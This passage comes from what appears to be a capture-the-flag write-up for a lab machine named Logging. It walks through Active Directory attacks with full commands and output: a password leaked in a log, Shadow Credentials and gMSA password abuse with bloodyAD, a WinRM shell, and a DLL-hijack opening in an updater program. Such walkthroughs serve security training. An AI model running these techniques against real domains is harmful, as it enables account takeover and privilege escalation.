[2026-02-09 03:00:03.650] [PID:4102] [Thread:12] CRITICAL - Domain-wide LDAP bind failure. Task aborted.
[2026-02-10 03:00:03.702] [PID:4102] [Thread:12] DEBUG - Generating SMTP alert for it-alerts@logging.htb
[2026-02-10 03:00:04.112] [PID:4102] [Thread:12] INFO  - Process exit code: 1. Cleaning up session buffers.
[2026-02-10 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-11 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-02-11 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-11 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-02-11 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-11 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-02-11 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-11 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-02-19 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-19 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-29 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-02-29 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-29 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-02-29 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-29 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-02-29 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-02-29 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-03-09 02:55:00.822] [PID:4102] [Thread:01] DEBUG - Integrity check: All module hashes verified (SHA256).
[2026-03-09 03:00:01.442] [PID:4102] [Thread:12] INFO  - Service: logging.IdentitySync.Engine.Internal (v2.4.2.0)
[2026-03-09 03:00:01.458] [PID:4102] [Thread:12] DEBUG - Environment: OS=Microsoft Windows Server 2019, CoreCount=4, Mem=16GB
[2026-03-09 03:00:01.470] [PID:4102] [Thread:12] INFO  - Initializing module [HR-Connector]...
[2026-03-09 03:00:02.215] [PID:4102] [Thread:12] INFO  - Establishing SQL session with HR01.logging.htb...
[2026-03-09 03:00:02.890] [PID:4102] [Thread:08] TRACE - Querying [loggingHR].[dbo].[Employees] where SyncStatus = 0
[2026-03-09 03:00:03.012] [PID:4102] [Thread:08] INFO  - SQL Session verified. Synchronizing 14 records (BatchID: 88AF-01).
[2026-03-09 03:00:03.055] [PID:4102] [Thread:04] INFO  - Validating AD target health: DC01.logging.htb (Port 389)
[2026-03-09 03:00:03.110] [PID:4102] [Thread:04] TRACE - Initializing LdapConnection object...
[2026-03-09 03:00:03.110] [PID:4102] [Thread:04] TRACE - Success LdapConnection object...
[2026-03-09 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-03-09 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-03-09 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...
[2026-03-09 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
[2026-03-09 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.
[2026-03-09 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.o
```

It’s the only log with any data in it, and it has a crash in the middle that leaks creds:

```plaintext
[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: { Domain: "logging.htb", Server: "DC01", SSL: "False", BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025", Timeout: 30 }
[2026-02-19 03:00:03.488] [PID:4102] [Thread:04] ERROR - System.DirectoryServices.Protocols.LdapException: A local error occurred.
   at System.DirectoryServices.Protocols.LdapConnection.Bind(NetworkCredential credential)
   at logging.IdentitySync.Engine.LdapProvider.Connect()
   --- Server Error Details ---
   Server error: 8009030C: LdapErr: DSID-0C090569, comment: AcceptSecurityContext error, data 52e, v4563
   Hex Error: 0x31 (LDAP_INVALID_CREDENTIALS)
   Win32 Error: 49 (Invalid Credentials)
   ----------------------------
```

## Auth as svc_recovery

### Fail To Validate Creds

Trying to use the creds from the log returns a `STATUS_ACCOUNT_RESTRICTION` error:

```console
oxdf@hacky$ netexec smb dc01.logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2025'
SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.245.130  445    DC01             [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2025 STATUS_ACCOUNT_RESTRICTION
```

This does not mean that the password is bad, but rather that the password was accepted but policy restrictions blocked the login. That could be logon-hours restrictions, workstation restrictions, account disabled/expired/locked, or NTLM (the default auth attempted by `netexec`) blocked.

Trying over Kerberos shows a different error:

```console
oxdf@hacky$ netexec smb dc01.logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2025' -k
SMB         dc01.logging.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc01.logging.htb 445    DC01             [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2025 KDC_ERR_PREAUTH_FAILED
```

This means that the password is not correct. These together, along with the fact that the credentials stopped working during the previous run in 2026, suggest this password used to work, but doesn’t work any more.

### Correct Creds

Given that the password “Em3rg3ncyPa$$2025” used to work but doesn’t any more, it makes sense to try “Em3rg3ncyPa$$2026”:

```console
oxdf@hacky$ netexec smb dc01.logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2026'
SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.245.130  445    DC01             [-] logging.htb\svc_recovery:Em3rg3ncyPa$$2026 STATUS_ACCOUNT_RESTRICTION
oxdf@hacky$ netexec smb dc01.logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2026' -k
SMB         dc01.logging.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         dc01.logging.htb 445    DC01             [+] logging.htb\svc_recovery:Em3rg3ncyPa$$2026
```

NTLM still shows `STATUS_ACCOUNT_RESTRICTION`, but Kerberos works! The fact that the restriction sticks even with the correct password confirms it was never about the password. NTLM authentication is simply disabled for this account, which is why the 2025 attempt looked the same over NTLM even though that password was wrong.

## Shell as MSA_HEALTH$

### Enumeration

svc_recovery doesn’t have any additional share access. BloodHound does show that it has an interesting Outbound control:

![image-20260710210547132](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260710210547132.png)

The account has `GenericWrite` over the MSA_HEALTH$ machine account. And, that account is in Remote Management Users (so it should be able to get a shell over WinRM):

![image-20260710210657199](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260710210657199.png)

### Abuse GenericWrite

#### Shadow Credential

With `GenericWrite`, there are a few ways to take over the account. An easy and straightforward one is to add a Shadow Credential. This writes an attacker-controlled certificate into the account’s `msDS-KeyCredentialLink` attribute, which I can then use to authenticate with PKINIT and recover the account’s NT hash. I can do it in one line with `bloodyAD` with the following options:

- `--host dc01.logging.htb` - The host to target.
- `-d logging.htb` - The domain to target.
- `-u svc_recovery` - The user to authenticate as.
- `-p 'Em3rg3ncyPa$$2026'` - The user’s password.
- `-k` - Use Kerberos. If `-p` is also given, `bloodyAD` will use the password to get a TGT.
- `add shadowCredentials 'MSA_HEALTH$'` - Action is to add a shadow credential to the MSA_HEALTH$ account.

It works:

```console
oxdf@hacky$ bloodyAD --host dc01.logging.htb -d logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2026' -k  add shadowCredentials 'MSA_HEALTH$'
[+] KeyCredential generated with following sha256 of RSA key: fbc987a526357cea699276a7420be307fceac99b5807d2ae21e724998f0107bb
[+] TGT stored in ccache file msa_health_cG.ccache

NT: 603fc24ee01a9409f83c9d1d701485c5
```

The resulting NT hash can be used to auth:

```console
oxdf@hacky$ netexec smb DC01.logging.htb -u 'MSA_HEALTH$' -H 603fc24ee01a9409f83c9d1d701485c5 -k
SMB         DC01.logging.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         DC01.logging.htb 445    DC01             [+] logging.htb\MSA_HEALTH$:603fc24ee01a9409f83c9d1d701485c5
```

I’ll use the NT hash with `evil-winrm-py` to get a shell:

```console
oxdf@hacky$ evil-winrm-py -i DC01.logging.htb -u 'MSA_HEALTH$' -H 603fc24ee01a9409f83c9d1d701485c5
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'DC01.logging.htb:5985' as 'MSA_HEALTH$'
evil-winrm-py PS C:\Users\msa_health$\Documents>
```

#### gMSA

`GenericWrite` also opens a second, completely different path to this account, because MSA_HEALTH$ is a Group Managed Service Account (gMSA). The MSA_HEALTH$ account looks like a service account, and `netexec` will confirm it:

```console
oxdf@hacky$ netexec ldap dc01.logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2026' -k --gmsa
LDAP        dc01.logging.htb 389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:logging.htb) (signing:None) (channel binding:Never)
LDAP        dc01.logging.htb 389    DC01             [+] logging.htb\svc_recovery:Em3rg3ncyPa$$2026
LDAP        dc01.logging.htb 389    DC01             [*] Getting GMSA Passwords
LDAP        dc01.logging.htb 389    DC01             Account: msa_health$          NTLM: <no read permissions>                PrincipalsAllowedToReadPassword: []
```

It queries for objects with `objectClass=msDS-GroupManagedServiceAccount`. msa_health$ is a gMSA account, but there are no accounts allowed to read its password. I can see this more fully with `ldapsearch`:

```console
oxdf@hacky$ ldapsearch -x -H ldap://dc01.logging.htb -D 'wallace.everette@logging.htb' -w 'Welcome2026@' -b 'CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb' objectClass msDS-ManagedPasswordId msDS-GroupMSAMembership sAMAccountType
# extended LDIF
#
# LDAPv3
# base <CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: objectClass msDS-ManagedPasswordId msDS-GroupMSAMembership sAMAccountType
#

# msa_health, Managed Service Accounts, logging.htb
dn: CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
objectClass: computer
objectClass: msDS-GroupManagedServiceAccount
sAMAccountType: 805306369
msDS-ManagedPasswordId:: AQAAAEtEU0sCAAAAbAEAAAIAAAABAAAABtA80N8pE5wgJbudpD4Kk
 gAAAAAYAAAAGAAAAGwAbwBnAGcAaQBuAGcALgBoAHQAYgAAAGwAbwBnAGcAaQBuAGcALgBoAHQAYg
 AAAA==

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

These results confirm this is a gMSA. The `objectClass: msDS-GroupManagedServiceAccount` is the designation for a Group Managed Service Account, one whose password Active Directory generates and rotates automatically. The `msDS-GroupMSAMembership` attribute I requested comes back empty, which is why `netexec` reported no accounts able to read the password.

`GenericWrite` over the account lets me overwrite `msDS-GroupMSAMembership`. To add svc_recovery to that list, I’ll use `bloodyAD` to set a new SDDL security descriptor as the value. Claude gives me the format for the SDDL:

```asciiart
O:S-1-5-32-544D:(A;;0xf01ff;;;<SID>)
\____________/\____________________/
   owner (O:)       DACL (D:)
```

That breaks down to:

| Piece | Value | Meaning |
|---|---|---|
| `O:S-1-5-32-544` | Built-in Administrators | Owner of the SD — cosmetic; matches what bloodyAD hardcodes |
| `D:(...)` | the DACL | the list of who may read the password |
| `A` | Allow | ACE type |
| `0xf01ff` | full access mask | read rights (this is what grants the retrieval) |
| `<SID>` | svc_recovery’s SID | the principal being granted |

I’ll grab the SID of svc_recovery from the BloodHound data, and use `bloodyAD` to set the `msDS-GroupMSAMembership` so that svc_recovery can read the gMSA:

```console
oxdf@hacky$ bloodyAD --host dc01.logging.htb -d logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2026' -k  set object 'MSA_HEALTH$' msDS-GroupMSAMembership -v 'O:S-1-5-32-544D:(A;;0xf01ff;;;S-1-5-21-4020823815-2796529489-1682170552-2104)'
[+] MSA_HEALTH$'s msDS-GroupMSAMembership has been updated
```

Now svc_recovery can read it with `netexec`:

```console
oxdf@hacky$ netexec ldap dc01.logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2026' -k --gmsa
LDAP        dc01.logging.htb 389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:logging.htb) (signing:None) (channel binding:Never)
LDAP        dc01.logging.htb 389    DC01             [+] logging.htb\svc_recovery:Em3rg3ncyPa$$2026
LDAP        dc01.logging.htb 389    DC01             [*] Getting GMSA Passwords
LDAP        dc01.logging.htb 389    DC01             Account: msa_health$          NTLM: 946b33cc5505890cea9a4b5605b8cbd6     PrincipalsAllowedToReadPassword: svc_recovery
```

And the hash works to get a shell:

```console
oxdf@hacky$ evil-winrm-py -i DC01.logging.htb -u 'MSA_HEALTH$' -H 946b33cc5505890cea9a4b5605b8cbd6
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'DC01.logging.htb:5985' as 'MSA_HEALTH$'
evil-winrm-py PS C:\Users\msa_health$\Documents>
```

*Updated 18 July After Initial Publishing*: [IppSec showed](https://youtu.be/-SLJWkn1tzo?si=jhh5BA8YnKoRiPQG&t=1013) a command that I missed in `bloodyAD` that makes calculating the SDDL unnecessary. At the time of Logging’s retirement, this isn’t in a packaged version of `bloodyAD`. It was added in [this commit](https://github.com/CravateRouge/bloodyAD/commit/292ff15e3e6e7dde0a719ac479b62d62d5422389) on 22 April 2026, after the latest release of version 2.5.4 on 31 January 2026. I can install from the main branch with:

```console
oxdf@hacky$ uv tool install https://github.com/CravateRouge/bloodyAD.git
Resolved 20 packages in 90ms
    Updated https://github.com/CravateRouge/bloodyAD.git (d1f3a5ce52f4115c0321366fe4a4e331daecc766
      Built bloodyad @ git+https://github.com/CravateRouge/bloodyAD.git@d1f3a5ce52f4115c0321366fe4
Prepared 1 package in 963ms
Uninstalled 1 package in 2ms
Installed 1 package in 2ms
 - bloodyad==2.5.4
 + bloodyad==2.5.4 (from git+https://github.com/CravateRouge/bloodyAD.git@d1f3a5ce52f4115c0321366fe4a4e331daecc766)
Installed 2 executables: bloodyAD, bloodyad
```

And then this works:

```console
oxdf@hacky$ bloodyAD --host dc01.logging.htb -d logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2026' -k  add gmsaGroup 'msa_health$' svc_recovery
[+] svc_recovery can now retrieve the password of msa_health$

distinguishedName: CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb
msDS-ManagedPassword.NT: 946b33cc5505890cea9a4b5605b8cbd6
msDS-ManagedPassword.B64ENCODED: ToWejkhqeqlr592XZFJiywma3i8soUFD3iteOthcCSlHsMGebAsX+X51SbGJIKMgwiI/IK/EKMvoksip7g1j61wJGbnlKc4ICgUObogYVKKgejw9D1CyksBMh3dvPjxObcyBZSN4pHDRxkq3izw7BQpJcTYEdsnxHSNF6xAsEUvgG60YVHOgP9/HykJyLCpxHx8JmEi4Ye9m4QvkKKIi8GO6RnoIEHD2PYy7CQ3sjdJjBzkMYCCd66s7ycbzBi9Nal5bdfHvWmhK9udt8HVcIA0AAQnZByROHtHQ8pCmj0NwSe56iemaM88jhnGdb4gUVT1tFJAZHErUtrIiMn8Apg==
```

And I can dump the NTLM as above.

In general, I don’t like to have my tools out of date with released versions, so I’ll probably uninstall and reinstall with `uv tool install bloodyAD` once I’m done here.

## Shell as jaylee.clifton

### Enumeration

#### Users

There are three non-admin users with home directories in `\Users`:

```console
evil-winrm-py PS C:\Users> ls

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/16/2026   5:27 PM                .NET v4.5
d-----        4/16/2026   5:27 PM                .NET v4.5 Classic
d-----        4/16/2026   8:30 PM                Administrator
d-----        4/16/2026   4:41 PM                jaylee.clifton
d-----        4/17/2026   8:33 AM                msa_health$
d-r---        4/10/2020  10:49 AM                Public
d-----        4/17/2026   1:47 PM                toby.brynleigh
```

The only directory that I can access as msa_health$ is that user’s directory. It’s very empty, other than one file:

```console
evil-winrm-py PS C:\Users\msa_health$> tree /f
Folder PATH listing
Volume serial number is C007-7498
C:.
ÃÄÄÄDesktop
ÃÄÄÄDocuments
³       monitor.ps1
³
ÃÄÄÄDownloads
ÃÄÄÄFavorites
ÃÄÄÄLinks
ÃÄÄÄMusic
ÃÄÄÄPictures
ÃÄÄÄSaved Games
ÀÄÄÄVideos
```

`monitor.ps1` is what is responsible for updating the log in `\Share\Logs\TaskMonitor.log`:

```powershell
<#
.SYNOPSIS
    Monitors the status of the "UpdateChecker Agent" scheduled task.
    Uses COM interface to avoid CIM/WMI permission issues.
#>

$TaskName = "UpdateChecker Agent"
$LogPath = "C:\Share\Logs\TaskMonitor.log"
$Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

try {
    $service = New-Object -ComObject "Schedule.Service"
    $service.Connect()
    $task = $service.GetFolder("\").GetTask($TaskName)

    $State = switch ($task.State) {
        1 { "Disabled" }
        2 { "Queued" }
        3 { "Ready" }
        4 { "Running" }
        5 { "Disabled" }
        6 { "Unknown" }
        default { "Unknown" }
    }

    if ($State -ne "Ready" -and $State -ne "Running") {
        $Message = "[$Timestamp] WARN  - Task [$TaskName] is in an unexpected state: $State"
    }
    else {
        $Message = "[$Timestamp] INFO  - Task [$TaskName] health check: OK (State: $State)"
    }
}
catch {
    $Message = "[$Timestamp] ERROR - Failed to query task [$TaskName]. Exception: $($_.Exception.Message)"
}

Add-Content -Path $LogPath -Value $Message
```

It queries the Scheduled Tasks service to get a task named “UpdateChecker Agent”, and gets the status, logging the result to `C:\Share\Logs\TaskMonitor.log`.

It doesn’t seem like `monitor.ps1` is still running:

```console
evil-winrm-py PS C:\> cat Share\Logs\TaskMonitor.log
[2026-02-20 09:56:48] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-20 09:56:56] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-20 09:57:24] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-20 10:01:12] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-20 10:02:44] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-20 10:07:47] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-20 10:15:12] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-22 01:44:37] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-22 01:50:11] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-22 01:54:18] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-22 02:10:04] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-22 02:21:46] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-22 02:55:28] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
evil-winrm-py PS C:\> date

Saturday, July 11, 2026 1:25:37 AM
```

#### UpdateMonitor

Even without `monitor.ps1`, I can check the task using the same commands:

```console
evil-winrm-py PS C:\Users\msa_health$> $service = New-Object -ComObject "Schedule.Service"
evil-winrm-py PS C:\Users\msa_health$> $service.Connect()
evil-winrm-py PS C:\Users\msa_health$> $TaskName = "UpdateChecker Agent"
evil-winrm-py PS C:\Users\msa_health$> $task = $service.GetFolder("\").GetTask($TaskName)
evil-winrm-py PS C:\Users\msa_health$> $task

Name               : UpdateChecker Agent
Path               : \UpdateChecker Agent
State              : 3
Enabled            : True
LastRunTime        : 7/11/2026 1:23:15 AM
LastTaskResult     : 0
NumberOfMissedRuns : 0
NextRunTime        : 7/11/2026 1:26:15 AM
Definition         : System.__ComObject
Xml                : <?xml version="1.0" encoding="UTF-16"?>
                     <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
                       <RegistrationInfo>
                         <Date>2026-04-16T16:39:34.3280175</Date>
                         <Author>logging\Administrator</Author>
                         <URI>\UpdateChecker Agent</URI>
                       </RegistrationInfo>
                       <Principals>
                         <Principal id="Author">
                           <UserId>S-1-5-21-4020823815-2796529489-1682170552-2105</UserId>
                           <LogonType>Password</LogonType>
                         </Principal>
                       </Principals>
                       <Settings>
                         <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
                         <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
                         <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
                         <IdleSettings>
                           <StopOnIdleEnd>true</StopOnIdleEnd>
                           <RestartOnIdle>false</RestartOnIdle>
                         </IdleSettings>
                       </Settings>
                       <Triggers>
                         <TimeTrigger>
                           <StartBoundary>2026-04-16T16:38:15</StartBoundary>
                           <Repetition>
                             <Interval>PT3M</Interval>
                           </Repetition>
                         </TimeTrigger>
                       </Triggers>
                       <Actions Context="Author">
                         <Exec>
                           <Command>"C:\Program Files\UpdateMonitor\UpdateMonitor.exe"</Command>
                           <Arguments>500 /scan=3 /autofix=true</Arguments>
                         </Exec>
                       </Actions>
                     </Task>
```

It seems to run every 3 minutes, executing `C:\Program Files\UpdateMonitor\UpdateMonitor.exe` as the user with the SID `S-1-5-21-4020823815-2796529489-1682170552-2105`.

I can use `lookupsid.py` (from [Impacket](https://github.com/SecureAuthCorp/impacket)) to dump domain SIDs:

```console
oxdf@hacky$ lookupsid.py logging.htb/wallace.everette:'Welcome2026@'@10.129.245.130
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Brute forcing SIDs at 10.129.245.130
[*] StringBinding ncacn_np:10.129.245.130[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4020823815-2796529489-1682170552
498: logging\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: logging\Administrator (SidTypeUser)
501: logging\Guest (SidTypeUser)
502: logging\krbtgt (SidTypeUser)
512: logging\Domain Admins (SidTypeGroup)
513: logging\Domain Users (SidTypeGroup)
514: logging\Domain Guests (SidTypeGroup)
515: logging\Domain Computers (SidTypeGroup)
516: logging\Domain Controllers (SidTypeGroup)
517: logging\Cert Publishers (SidTypeAlias)
518: logging\Schema Admins (SidTypeGroup)
519: logging\Enterprise Admins (SidTypeGroup)
520: logging\Group Policy Creator Owners (SidTypeGroup)
521: logging\Read-only Domain Controllers (SidTypeGroup)
522: logging\Cloneable Domain Controllers (SidTypeGroup)
525: logging\Protected Users (SidTypeGroup)
526: logging\Key Admins (SidTypeGroup)
527: logging\Enterprise Key Admins (SidTypeGroup)
553: logging\RAS and IAS Servers (SidTypeAlias)
571: logging\Allowed RODC Password Replication Group (SidTypeAlias)
572: logging\Denied RODC Password Replication Group (SidTypeAlias)
1000: logging\DC01$ (SidTypeUser)
1101: logging\DnsAdmins (SidTypeAlias)
1102: logging\DnsUpdateProxy (SidTypeGroup)
2101: logging\Emergency Recovery (SidTypeGroup)
2102: logging\IT (SidTypeGroup)
2103: logging\HR (SidTypeGroup)
2104: logging\svc_recovery (SidTypeUser)
2105: logging\jaylee.clifton (SidTypeUser)
2106: logging\monique.chip (SidTypeUser)
2107: logging\kyson.abel (SidTypeUser)
2108: logging\fable.milford (SidTypeUser)
2109: logging\wellington.kylan (SidTypeUser)
2110: logging\serina.philander (SidTypeUser)
2111: logging\wallace.everette (SidTypeUser)
2112: logging\toby.brynleigh (SidTypeUser)
2113: logging\msa_health$ (SidTypeUser)
2601: logging\WSUS Administrators (SidTypeAlias)
2602: logging\WSUS Reporters (SidTypeAlias)
```

This runs as jaylee.clifton.

The binary is in `C:\Program Files\UpdateMonitor`:

```console
evil-winrm-py PS C:\Program Files\UpdateMonitor> ls

    Directory: C:\Program Files\UpdateMonitor

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/16/2026   4:10 PM                bin
d-----        4/16/2026   4:10 PM                packages
-a----        2/21/2026   3:52 PM            189 App.config
-a----        2/21/2026   3:52 PM            157 packages.config
-a----        4/24/2026   9:06 AM           8704 UpdateMonitor.exe
```

I can read and execute it, but not write:

```console
evil-winrm-py PS C:\Program Files\UpdateMonitor> icacls UpdateMonitor.exe
UpdateMonitor.exe logging\IT:(I)(F)
                  NT AUTHORITY\SYSTEM:(I)(F)
                  BUILTIN\Administrators:(I)(F)
                  BUILTIN\Users:(I)(RX)
                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

I’ll download a copy of `UpdateMonitor.exe`:

```console
evil-winrm-py PS C:\Program Files\UpdateMonitor> download UpdateMonitor.exe UpdateMonitor.exe
Downloading C:\Program Files\UpdateMonitor\UpdateMonitor.exe: 64.0kB [00:00, 400MB/s]
[+] File downloaded successfully and saved as: /home/oxdf/hackthebox/logging-10.129.245.130/UpdateMonitor.exe
```

#### Reversing UpdateMonitor.exe

The binary is a .NET assembly:

```console
oxdf@hacky$ file UpdateMonitor.exe
UpdateMonitor.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

I’ll open it in [DotPeek](https://www.jetbrains.com/decompiler/). It has a single class, `Program`:

![image-20260710214342549](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260710214342549.png)

At the top of `Main`, it defines some strings:

```cs
    private static void Main(string[] args)
    {
      string str1 = "C:\\ProgramData\\UpdateMonitor\\Logs\\monitor.log";
      string str2 = "C:\\ProgramData\\UpdateMonitor\\Settings_Update.zip";
      string str3 = "C:\\Program Files\\UpdateMonitor\\bin\\";
      string path2 = "settings_update.dll";
      string str4 = Path.Combine(str3, path2);
```

Later, there’s a crude update mechanism:

```cs
      if (File.Exists(str2))
      {
        try
        {
          if (File.Exists(str4))
          {
            Program.KillOtherInstances(str1);
            File.Delete(str4);
          }
          ZipFile.ExtractToDirectory(str2, str3);
          Program.Log(str1, "Successfully unzipped update to " + str3);
        }
        catch (IOException ex)
        {
          Program.Log(str1, "Update failed: " + ex.Message);
        }
        catch (Exception ex)
        {
          Program.Log(str1, "Update failed: " + ex.Message);
        }
      }
```

If `Settings_Update.zip` exists, it deletes `settings_update.dll` in the `bin` directory, and then extracts the contents of the zip into `bin`.

Later, it loads that DLL:

```cs
      IntPtr hModule = Program.LoadLibrary(str4);
```

This is what makes the update mechanism exploitable. `LoadLibrary` runs the DLL’s `DllMain` entry point as it loads, and an msfvenom DLL payload lives in `DllMain`, so simply getting the program to load my DLL executes my shellcode.

### Malicious Update

`C:\\ProgramData\\UpdateMonitor\\Settings_Update.zip` doesn’t exist on Logging:

```console
evil-winrm-py PS C:\ProgramData\UpdateMonitor> ls

    Directory: C:\ProgramData\UpdateMonitor

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/16/2026   4:43 PM                Logs
```

Looking at the ACLs on the directory, I should be able to write it:

```console
evil-winrm-py PS C:\ProgramData\UpdateMonitor> icacls .
. NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(F)
  CREATOR OWNER:(I)(OI)(CI)(IO)(F)
  BUILTIN\Users:(I)(OI)(CI)(RX)
  BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)

Successfully processed 1 files; Failed processing 0 files
```

